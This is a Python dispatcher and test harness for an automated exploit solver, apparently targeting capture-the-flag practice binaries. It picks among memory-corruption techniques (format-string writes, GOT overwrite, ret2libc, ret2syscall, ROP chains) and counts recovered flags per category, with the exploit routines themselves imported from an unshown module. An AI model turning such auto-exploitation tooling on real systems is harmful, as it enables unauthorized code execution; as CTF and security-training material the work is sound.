import time
import json

from dynamic import Dynamic
from static import Static
from exploits import Exploits

# this is the function that will detect what exploit to use and call it 
def handle_exploits(binary):
    e = Exploits(binary)
    d = Dynamic()
    s = Static()

    printf = d.detect_printf_vuln(binary)
    win = False
    libc_leak = None
    syscall = None
    binsh = None

    if printf == "array":
        print("[*] Array abuse detected.")

        flag = e.arrayabuse(binary)

        if not flag:
            pass

        return flag.decode()
        
    # printf vulns -- read/write/got overwrite
    if printf == "printf":
        if "pwnme" in e.pwnelf.sym.keys():
            print("[*] Printf write var detected.")

            flag = e.printf_write_var(binary)

            if not flag:
                # kys???
                pass

            return flag.decode()

        if "win" in e.pwnelf.sym.keys():
            print("[*] GOT overwrite detected.")

            vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
            flag = e.got_overwrite(binary, vuln)

            if not flag:
                # kys again???
                pass

            return flag.decode()


        # printf read
        print("[*] Printf read var detected")

        flag = e.printf_read_var(binary)

        if not flag:
            # angr??
            pass

        return flag.decode()
    
    elif printf == "libc":
        # libc leak -- ret2one
        print("[*] ret2one detected.")
        
        vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
        libc_leak = s.find_given_leaks(vuln)
        
        flag = e.ret2one(binary, libc_leak)

        if not flag:
            print("[*] Running without a ret")

            flag = e.ret2one(binary, libc_leak, False)

            if not flag:
                print("[*] Trying angr")
                flag = e.ret2one(binary, libc_leak, False, use_angr=True)
            
            if not flag:
                flag = e.ret2one(binary, libc_leak, True, use_angr=True)

        return flag.decode()

    # ret2win -- order might change 
    if "win" in e.pwnelf.sym.keys():
        print("[*] ret2win detected")

        flag = e.ret2win(binary)

        if not flag:
            # angr
            pass

        return flag.decode()

    # check for "win" in pwnelf.sym -- ret2win/rop params
    if "constrained_win" in e.pwnelf.sym.keys():
        print("[*] ROP Parameters detected")

        constrained_win = json.loads(e.pipe.cmd("pdfj @ sym.constrained_win"))
        flag = e.rop_parameters(binary, constrained_win)

        if not flag:
            # angr
            pass

        return flag.decode()


        # check for "execve" in pwnelf.plt -- ret2execve
    if "execve" in e.pwnelf.plt.keys():
        print("[*] ret2execve detected.")
        
        flag = e.ret2execve(binary)

        if not flag:
            print("[*] Using angr")
            flag = e.ret2execve(binary, use_angr=True)

        return flag.decode()
    
    try:
        binsh = next(e.pwnelf.search(b"/bin/sh"))

    except:
        pass
    
    try:
        binsh = next(e.pwnelf.search(b"cat flag.txt"))

    except:
        pass
    


    # check for "system" in pwnelf.plt -- ret2system or write gadgets
    if "system" in e.pwnelf.plt.keys() and binsh:
        print("[*] ret2system detected.")

        flag = e.ret2system(binary)

        if not flag:
            # run without ret and then angr!!
            print("[*] Running without a ret")

            flag = e.ret2system(binary)

            if not flag:
                flag = e.ret2system(binary, use_angr=True)

        return flag.decode()

    elif "system" in e.pwnelf.plt.keys():
        print("[*] Write gadgets detected.")

        flag = e.write_gadgets(binary)

        if not flag:
            print("[*] Trying with a ret")

            flag = e.write_gadgets(binary, add_ret=True)

        if not flag:
            # bruh
            pass

        return flag.decode()

    # syscall gadget -- ret2syscall
    for file, gadget in e.rs.search(search="syscall"):
        if "syscall;" in str(gadget):
            syscall = int(str(gadget).split(":")[0], 16)
            break

    
    if syscall:
        print("[*] ret2syscall detected.")

        flag = e.ret2syscall(binary, syscall)

        if not flag:
            print("[*] Shortening ROP chain 1.")

            flag = e.ret2syscall(binary, syscall, 1)

        if not flag:
            print("[*] Shortening ROP chain 2.")

            flag = e.ret2syscall(binary, syscall, 2)

        if not flag:
            print("[*] Shortening ROP chain 3.")

            flag = e.ret2syscall(binary, syscall, 3)

        return flag.decode()
    
    
    print("[!] Exploit detection error! Returning None.")

    return None

# ================ TESTING GROUNDS ===================


def test_category(category):
    bins = [ f"./ace-student/test-bins/{category}-{i}" for i in range(10) ]
    count = 0
    start = time.time()
    failed = []

    #flag = handle_exploits(bins[2])

    for binary in bins:
        print("========== " + binary)
        #flag = handle_exploits(binary)
        
        try:
            flag = handle_exploits(binary)

            if flag == "flag{your_mom_is_very_beautiful_to_me}":
                count += 1

            else:
                failed.append(binary)

        except:
            failed.append(binary)
            pass

    end = time.time()
    print(failed)
    print(f"==== Test conclusion: {count}/10 in {round(end - start, 2)} seconds. ====")

    return [count, round(end - start, 2)]
    #print(flags)

def deep_test():
    categories = [
        "bin-arrayabuse",
        "bin-got-overwrite",
        "bin-printf-read-var",
        "bin-printf-write-var",
        "bin-ret2execve",
        "bin-ret2one",
        "bin-ret2syscall",
        "bin-ret2system",
        "bin-ret2win",
        "bin-rop-parameters",
        "bin-write-gadgets"
    ]

    results = []
    total = [0, 0]

    for cat in categories:
        try:
            alice = test_category(cat)
            total[0] += alice[0]
            total[1] += alice[1]
            results.append(alice)

        except:
            print("Error in " + cat)
            results.append([-1, -1])

    print("================ RESULTS ================\n")
    for i in range(len(categories)):
        print(f"{categories[i]}: {results[i][0]}/10 in {results[i][1]} seconds.")

    print(f"\nTotal: {total[0]}/110 in {total[1]} seconds (or {round(total[1] / 60, 2)} minutes).\n")
    print("=========================================")


test_category("bin-rop-parameters")
#deep_test()

#flag = handle_exploits("./ace-student/test-bins/bin-ret2win-0")
#print(flag)

